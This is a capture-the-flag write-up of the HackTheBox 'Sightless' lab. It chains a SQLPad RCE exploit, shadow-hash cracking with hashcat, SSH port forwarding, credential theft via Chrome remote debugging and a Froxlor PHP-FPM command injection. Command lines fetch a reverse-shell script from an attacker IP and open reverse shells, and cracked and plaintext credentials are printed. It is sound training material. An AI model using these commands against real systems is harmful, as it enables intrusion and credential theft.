---
title: Sightless
tags:
  - HackTheBox
  - Easy
  - SQLPad
  - Brute-Forcing
  - Tunnelling
  - Froxlor
  - Chrome-Debugging
---
![](Pasted%20image%2020240919153753.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.32 sightless.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- sightless.htb > sC.txt

[redacted]
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http
|_http-title: Sightless.htb
```

Let's inspect the website:

![](Pasted%20image%2020240919154637.png)

After inspecting the code, I discovered the subdomain `sqlpad.sightless.htb`:

![](Pasted%20image%2020240919154722.png)

So I added it to the hosts file and took a look to it:

![](Pasted%20image%2020240919154906.png)

## Weaponization

I searched for **"sqlpad 6.10. cve"** and found [sqlpad-rce-exploit-CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944/tree/main)
- I also found this info in [huntr](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb), which is the PoC that uses the previous exploit
## Exploitation

> I executed the exploit like `python3 exploit.py http://sqlpad.sightless.htb 10.10.14.104 666` and got a reverse shell!

![](Pasted%20image%2020240919160328.png)

We can see that we are inside a container because of the `.dockerenv` file:

![](Pasted%20image%2020240919160812.png)

So as we are root, and after searching inside home directory didn't found anything, we can inspect the `/etc/shadow` file and try to crack michael's hash:
- Check the note [Crack Password Hashes (Sites) 🤡](/notes/crack_password_hashes.md)

```hash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

It seems to be SHA-512:
- `michael` is the username.
- `$6$` indicates the hashing algorithm (SHA-512).
- `mG3Cp2VPGY.FDE8u` is the salt.
- `KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/` is the hash.

We need to format the hash for Hashcat, so we will create a file containing the following:

```txt
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

So let's use Hashcat to crack the hash:

```shell
hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt

[redacted]
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
```

> So we can now ssh as `michael:insaneclownposse` and get user flag :D

![](Pasted%20image%2020240919162039.png)

## Privilege Escalation

Inspecting the `/home` directory seems to be another user called `john`, so I decided to run linpeas:

![](Pasted%20image%2020240919162619.png)

But this wasn't relevant, so I keep looking at linpeas output, and found an interesting port running something:

![](Pasted%20image%2020240919162842.png)

So I port forwarded the port 8080 to my machine:

```shell
ssh -L 8080:localhost:8080 -N michael@sightless.htb
```

The I searched for it:

![](Pasted%20image%2020240919163635.png)

I didn't know what was Froxlor, so I searched for it and found thet is a server management software. As I didn't know the passwd, I decided to take a look at this previous photo:

![](Pasted%20image%2020240919162619.png)+

Which lead me to know that Chrome was installed on the machine. I decided to start port-forwarding all left ports to debug them hoping to find some credentials.
- I found this [Blog](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) talking about *Chrome Remote Debugger Pentesting*:

1. First, port forward: `ssh -L 40235:localhost:40235 -N michael@sightless.htb`
2. Configure Network Targets in Chrome: 
	- Open Chrome Browser and input the sollowing string in URL bar: `chrome://inspect/#devices`
	- Then click `Configure` and apply the following configuration:

![](Pasted%20image%2020240919165549.png)

Go to inspect the new remote target:

![](Pasted%20image%2020240919165654.png)

![](Pasted%20image%2020240919165744.png)

Inspecting the `index.php` and the Payload option, we can see the credentials in plain text:

![](Pasted%20image%2020240919165954.png)

Credentials are: `admin:ForlorfroxAdmin`. So we log in:

![](Pasted%20image%2020240919170150.png)

I searched for **"Froxlor RCE"** and found this [Blog](https://sarperavci.com/Froxlor-Authenticated-RCE/) which lead to an authenticated RCE:
1. Get the creds
2. Set up custom PHP-FPM Restart Command:
	- Upload a reverse shell to the machine like: `wget http://10.10.14.104:8090/revshell.sh`
	- Go to `PHP >> PHP-FPM versions` and set a custom PHP-FPM restart command:

![](Pasted%20image%2020240919170939.png)

3. Restart PHP-FPM
	- Go to `System >> Settings` and click on PHP-FPM
	- Click on disable and wait a few seconds
	- Click on enable

![](Pasted%20image%2020240919171421.png)

> You must wait 5 minutes to get the reverse shell due to cron jobs (because the PHP-FPM service restarts every 5 minutes)

> After some time we get root access and the root flag :D

![](Pasted%20image%2020240919171626.png)

==Machine pwned!==